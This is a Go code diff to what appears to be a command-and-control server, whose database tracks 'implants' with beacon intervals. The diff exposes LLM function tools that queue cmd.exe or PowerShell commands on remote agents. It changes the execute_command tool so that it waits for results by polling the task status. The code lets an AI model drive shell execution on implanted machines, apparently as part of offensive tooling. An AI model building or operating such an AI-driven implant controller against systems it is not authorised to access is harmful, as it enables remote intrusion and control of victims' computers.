@@ -511,7 +511,7 @@ func buildTools() []toolDef {
 			Type: "function",
 			Function: toolFuncDef{
 				Name:        "execute_command",
-				Description: "Queue a command on the specified agent (returns immediately; does not wait for agent beacon). Use get_agent_tasks to read results later.",
+				Description: "Execute a command on the specified agent. By default waits up to 60s for the result (polls using the agent's beacon interval). Set wait_for_result=false to queue only.",
 				Parameters: map[string]interface{}{
 					"type": "object",
 					"properties": map[string]interface{}{
@@ -527,6 +527,10 @@ func buildTools() []toolDef {
 							"type":        "string",
 							"description": "Shell type: cmd.exe or powershell.exe",
 						},
+						"wait_for_result": map[string]interface{}{
+							"type":        "boolean",
+							"description": "Wait for command output (default true). When true, polls task status until completed/failed or 60s timeout.",
+						},
 					},
 					"required": []string{"agent_id", "command"},
 				},
@@ -536,7 +540,7 @@ func buildTools() []toolDef {
 			Type: "function",
 			Function: toolFuncDef{
 				Name:        "get_agent_tasks",
-				Description: "Get recent task list and results for a specified agent (use after execute_command to fetch output)",
+				Description: "Get recent task list and results for a specified agent (use when execute_command timed out or wait_for_result was false)",
 				Parameters: map[string]interface{}{
 					"type": "object",
 					"properties": map[string]interface{}{
@@ -629,21 +633,24 @@ func (s *Server) executeTool(name string, argsJSON string) string {
 		return string(b)
 
 	case "execute_command":
-		aid := s.resolveAgentID(args["agent_id"])
+		ecArgs := parseExecuteCommandArgs(argsJSON)
+		aid := s.resolveAgentID(ecArgs.AgentID)
 		if aid == "" {
 			return `{"error":"agent not found"}`
 		}
-		cmd := args["command"]
-		shell := args["shell"]
+		shell := ecArgs.Shell
 		if shell == "" {
 			shell = "cmd.exe"
 		}
 		task := db.Task{
-			AgentID: aid, Type: "shell", Command: cmd,
+			AgentID: aid, Type: "shell", Command: ecArgs.Command,
 			Shell: shell, Status: "pending",
 		}
 		if err := s.db.Create(&task).Error; err != nil {
 			return `{"error":"failed to create task"}`
+		}
+		if ecArgs.WaitForResult {
+			return s.waitForTaskResult(task.ID, aid)
 		}
 		b, _ := json.Marshal(map[string]interface{}{
 			"task_id": task.ID,
@@ -719,6 +726,119 @@ func truncateStr(s string, n int) string {
 		return s
 	}
 	return s[:n] + "..."
+}
+
+var (
+	taskWaitMaxDuration = 60 * time.Second
+	taskPollMinInterval = 250 * time.Millisecond
+)
+
+type executeCommandArgs struct {
+	AgentID       string
+	Command       string
+	Shell         string
+	WaitForResult bool
+}
+
+func parseExecuteCommandArgs(argsJSON string) executeCommandArgs {
+	var raw struct {
+		AgentID       string `json:"agent_id"`
+		Command       string `json:"command"`
+		Shell         string `json:"shell"`
+		WaitForResult *bool  `json:"wait_for_result"`
+	}
+	_ = json.Unmarshal([]byte(argsJSON), &raw)
+	out := executeCommandArgs{
+		AgentID:       raw.AgentID,
+		Command:       raw.Command,
+		Shell:         raw.Shell,
+		WaitForResult: true,
+	}
+	if raw.WaitForResult != nil {
+		out.WaitForResult = *raw.WaitForResult
+	}
+	return out
+}
+
+// taskPollIntervalSeconds returns poll interval in seconds: max(agent interval, 1).
+func taskPollIntervalSeconds(currentInterval int) int {
+	if currentInterval < 1 {
+		return 1
+	}
+	return currentInterval
+}
+
+// taskPollSleepDuration computes the next sleep duration respecting min poll and remaining wait budget.
+func taskPollSleepDuration(intervalSec int, remaining time.Duration) time.Duration {
+	sleep := time.Duration(taskPollIntervalSeconds(intervalSec)) * time.Second
+	if sleep < taskPollMinInterval {
+		sleep = taskPollMinInterval
+	}
+	if remaining > 0 && sleep > remaining {
+		sleep = remaining
+	}
+	return sleep
+}
+
+func isTaskTerminal(status string) bool {
+	return status == "completed" || status == "failed"
+}
+
+func marshalTaskResult(task db.Task, extra map[string]interface{}) string {
+	result := map[string]interface{}{
+		"task_id": task.ID,
+		"status":  task.Status,
+	}
+	for k, v := range extra {
+		result[k] = v
+	}
+	if task.Result != "" {
+		result["result"] = truncateStr(task.Result, 2000)
+	}
+	if task.Error != "" {
+		result["error"] = task.Error
+	}
+	b, _ := json.Marshal(result)
+	return string(b)
+}
+
+func (s *Server) waitForTaskResult(taskID uint, agentID string) string {
+	deadline := time.Now().Add(taskWaitMaxDuration)
+
+	var agent db.Implant
+	intervalSec := 1
+	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err == nil {
+		intervalSec = agent.CurrentInterval
+	}
+
+	for time.Now().Before(deadline) {
+		var task db.Task
+		if err := s.db.First(&task, taskID).Error; err != nil {
+			return `{"error":"task not found"}`
+		}
+
+		if isTaskTerminal(task.Status) {
+			return marshalTaskResult(task, nil)
+		}
+
+		remaining := time.Until(deadline)
+		if remaining <= 0 {
+			break
+		}
+		time.Sleep(taskPollSleepDuration(intervalSec, remaining))
+	}
+
+	var task db.Task
+	if err := s.db.First(&task, taskID).Error; err != nil {
+		return `{"error":"task not found"}`
+	}
+	if isTaskTerminal(task.Status) {
+		return marshalTaskResult(task, nil)
+	}
+	return marshalTaskResult(task, map[string]interface{}{
+		"message": "Task still pending after wait timeout. Use get_agent_tasks to check later.",
+		"waited":  taskWaitMaxDuration.Seconds(),
+	})
 }
 
 // buildClaudeRequest converts an OpenAI-format JSON payload to Anthropic Claude format
